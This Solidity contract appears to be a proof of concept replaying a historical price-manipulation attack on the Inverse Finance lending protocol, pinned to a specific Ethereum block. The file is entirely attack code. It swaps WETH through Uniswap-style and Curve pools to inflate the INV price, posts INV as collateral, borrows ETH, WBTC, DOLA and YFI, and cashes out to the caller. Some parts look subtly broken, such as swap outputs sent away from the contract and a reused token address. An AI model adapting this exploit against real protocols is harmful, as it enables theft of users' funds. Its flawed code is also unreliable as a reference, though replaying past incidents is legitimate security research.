// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

interface ERC20 {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address user) external returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint[] memory amounts);
}

interface Curve3Pool {
    function exchange_underlying(
        int128 i,
        int128 j,
        uint256 _dx,
        uint256 _min_dy
    ) external returns (uint256);
}

interface cERC20 {
    function mint(uint256 _amount) external;
    function borrow(uint256 _amount) external;
}

interface Comptroller {
    function enterMarkets(address[] memory ctokens) external;
}


contract ExploitInverseFinance {

    /// ███ Storages ███████████████████████████████████████████████████████████

    ERC20 private weth = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ERC20 private inv  = ERC20(0x41D5D79431A913C4aE7d69a668ecdfE5fF9DFB68);
    ERC20 private dola = ERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4); // 0
    ERC20 private usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // 2
    ERC20 private wbtc = ERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    ERC20 private yfi  = ERC20(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e);

    IUniswapV2Router02 private router = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    Curve3Pool         private pool   = Curve3Pool(0xAA5A67c256e27A5d80712c51971408db3370927D);
    Comptroller        private troll  = Comptroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);

    cERC20 private xinv   = cERC20(0x1637e4e9941D55703a7A5E7807d6aDA3f7DCD61B);
    cERC20 private anwbtc = cERC20(0x17786f3813E6bA35343211bd8Fe18EC4de14F28b);
    cERC20 private anyfi  = cERC20(0xde2af899040536884e062D3a334F2dD36F34b4a4);
    cERC20 private aneth  = cERC20(0x697b4acAa24430F254224eB794d2a85ba1Fa1FB8);
    cERC20 private andola = cERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);


    /// ███ Events █████████████████████████████████████████████████████████████

    event Debug(string msg);
    event Debug(string key, uint256 value);


    /// ███ Exploits ███████████████████████████████████████████████████████████

    /**
     * @notice Run this function at block 14506359
     * There are 2 steps of exploit: Manipulate the price then borrow using
     * manipulated collateral.
     */
    function reproduce() external {
        // Transfer WETH to this contract from msg.sender
        weth.transferFrom(msg.sender, address(this), 500 ether);
        emit Debug("Transfer WETH to contract: ", 500 ether);

        /// ███ INV price manipulation

        // Swap 300 WETH to INV
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(inv);
        weth.approve(address(router), 300 ether);
        uint256 invAmountOut1 = router.swapExactTokensForTokens(300 ether, 0, path, msg.sender, block.timestamp)[1];
        weth.approve(address(router), 0);
        emit Debug("Swap 300 WETH to INV. invAmountOut1 = ", invAmountOut1);

        // Swap 200 WETH to UDSC
        path[0] = address(weth);
        path[1] = address(usdc);
        weth.approve(address(router), 200 ether);
        uint256 usdcAmountOut = router.swapExactTokensForTokens(200 ether, 0, path, msg.sender, block.timestamp)[1];
        weth.approve(address(router), 0);
        emit Debug("Swap 200 WETH to USDC. usdcAmountOut = ", usdcAmountOut);

        // Swap USDC to DOLA via Curve
        usdc.approve(address(pool), usdcAmountOut);
        emit Debug("Test debug = ", usdcAmountOut);
        uint256 dolaAmountOut = pool.exchange_underlying(2, 0, usdcAmountOut, 0);
        usdc.approve(address(pool), 0);
        emit Debug("Swap USDC to DOLA via Curve. dolaAmountOut = ", dolaAmountOut);

        // Swap DOLA to INV
        path[0] = address(dola);
        path[1] = address(inv);
        dola.approve(address(router), dolaAmountOut);
        uint256 invAmountOut2 = router.swapExactTokensForTokens(dolaAmountOut, 0, path, msg.sender, block.timestamp)[1];
        dola.approve(address(router), 0);
        emit Debug("Swap DOLA to INV. invAmountOut2 = ", invAmountOut2);

        /// ███ Deposit INV as collateral
        address[] memory markets = new address[](4);
        markets[0] = address(xinv);
        markets[1] = address(anwbtc);
        markets[2] = address(anyfi);
        markets[3] = address(aneth);
        troll.enterMarkets(markets);
        xinv.mint(invAmountOut1 + invAmountOut2);
        emit Debug("Use INV as collateral. Total INV amount = ", invAmountOut1 + invAmountOut2);

        // ███ Borrow a bunch of tokens using manipulated collateral
        aneth.borrow(1_588 ether);
        emit Debug("Borrow 1588 ETH success");
        anwbtc.borrow(94 * 1e8);
        emit Debug("Borrow 94 WBTC success");
        andola.borrow(3_999_699 * 1e18);
        emit Debug("Borrow 3_999_699 DOLA success");
        anyfi.borrow(39 * 1e18);
        emit Debug("Borrow 39 YFI success");

        // ███ Cashout
        payable(msg.sender).call{value: 1588 ether};
        wbtc.transfer(msg.sender, wbtc.balanceOf(address(this)));
        dola.transfer(msg.sender, dola.balanceOf(address(this)));
        yfi.transfer(msg.sender, yfi.balanceOf(address(this)));
        emit Debug("Cashout success");
    }
}
